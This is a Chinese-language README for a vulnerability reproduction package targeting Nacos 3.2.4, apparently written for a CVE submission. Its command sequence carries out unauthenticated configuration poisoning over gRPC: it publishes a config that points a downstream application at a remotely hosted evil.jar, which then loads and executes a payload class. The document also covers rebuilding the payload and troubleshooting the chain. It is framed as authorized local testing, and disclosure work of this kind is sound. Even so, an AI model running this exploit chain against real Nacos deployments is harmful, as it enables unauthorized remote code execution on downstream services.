# Nacos 3.2.4 链 2 复现包（未授权配置投毒 → 下游 RCE）

> 用途：配合《Nacos-3.2.4-链2-配置投毒RCE-复现报告.docx》（上一级目录）与英文版报告（本目录）复现完整攻击链。
> 授权边界：仅用于授权安全测试，全部验证针对本地自建实例（127.0.0.1），未涉及任何第三方系统。

## 文件清单

| 文件 | 用途 |
|------|------|
| nacos_poc.py | 攻击原语（config-publish/query/remove/listen、instance-register/batch/remove、service-list/watch），零凭据 gRPC |
| nacos_grpc.proto | 协议定义（自 Nacos 内嵌 FileDescriptor 反推，字段编号与公开资料不同） |
| nacos_grpc_pb2.py / nacos_grpc_pb2_grpc.py | protoc 生成的 Python stub（已随包附带，无需重新生成） |
| EvilPlugin.java | payload 源码（whoami 回显；换命令只改 exec 参数） |
| evil.jar | 打包好的 payload（已验证字节码为 whoami 版） |
| Downstream.java | 下游模拟应用源码（订阅 + URLClassLoader 热加载） |
| Downstream.class / Downstream$1.class | 编译好的下游（两者必须同目录） |
| Nacos-3.2.4-ConfigPoisoning-RCE-Report-EN.docx | 英文版复现报告（CVE/VulDB 提交用） |

## 前置条件

- Nacos 3.2.4 已启动、完全就绪（state 接口返回 200 后再等 30 秒），且为默认姿态（`nacos.core.auth.enabled=false`）
- JDK 21（路径按实际改）、Python 3.7+ 已装 grpcio/protobuf/grpcio-tools
- 依赖库：本目录在 audit324 下两级，classpath 用 `..\..\unpacked\BOOT-INF\lib\*`（官方发行版依赖库，约 216MB，不随包分发）

## 快速复现（实测稳定序列，2026-09-29 两次全链验证通过）

```bat
:: 0) 确认无残留投毒配置（有则删——残留会导致推送不到，见排错第 3 条）
python nacos_poc.py config-remove --server 127.0.0.1:9848 --data-id plugin-config.properties --group DEFAULT_GROUP

:: 1) 窗口 A：攻击者 HTTP 服务
cd /d D:\武器库\AI-skill\zcode工作区\代码审计\audit324\链2-复现包\readme
python -m http.server 8000

:: 2) 窗口 B：下游应用（等 listening 行；NPE 堆栈为无害噪音）
"C:\Program Files\Java\jdk-21.0.4\bin\java.exe" -cp ".;..\..\unpacked\BOOT-INF\lib\*" Downstream

:: 3) 攻击：零凭据投毒（content 必须单行！）
python nacos_poc.py config-publish --server 127.0.0.1:9848 --data-id plugin-config.properties --group DEFAULT_GROUP --content "plugin.url=http://127.0.0.1:8000/evil.jar plugin.class=EvilPlugin"

:: 4) 等 3~8 秒，窗口 B 出现四行日志（第三行即命令回显）
::    [EvilPlugin] whoami = <机器名>\<用户名>
::    落盘取证：D:\武器库\AI-skill\zcode工作区\代码审计\audit324\rce_proof.txt（路径硬编码于 EvilPlugin.java）

:: 5) 清理
python nacos_poc.py config-remove --server 127.0.0.1:9848 --data-id plugin-config.properties --group DEFAULT_GROUP
powershell -Command "Remove-Item 'D:\武器库\AI-skill\zcode工作区\代码审计\audit324\rce_proof.txt'"
```

## 重建产物（改了 payload 源码后）

```bat
cd /d D:\武器库\AI-skill\zcode工作区\代码审计\audit324\链2-复现包\readme
"C:\Program Files\Java\jdk-21.0.4\bin\javac.exe" EvilPlugin.java
"C:\Program Files\Java\jdk-21.0.4\bin\jar.exe" cf evil.jar EvilPlugin.class
del EvilPlugin.class
"C:\Program Files\Java\jdk-21.0.4\bin\javac.exe" -cp "..\..\unpacked\BOOT-INF\lib\*" Downstream.java
```

## 排错（完整 9 条见报告第六节，这里是最高频 3 条）

1. **下游只收到 plugin.url 一段** → content 被 cmd 截断，必须单行空格分隔
2. **执行了旧 payload、无 whoami 回显** → JVM 双亲委派加载了磁盘残留的 `EvilPlugin.class`，重新打包后务必 `del EvilPlugin.class`
3. **投毒 200 但下游毫无反应（无 config received）** → 前次会话残留导致监听注册失效：先 `config-remove` 清场、重启窗口 B，再投毒（实测验证的恢复序列）
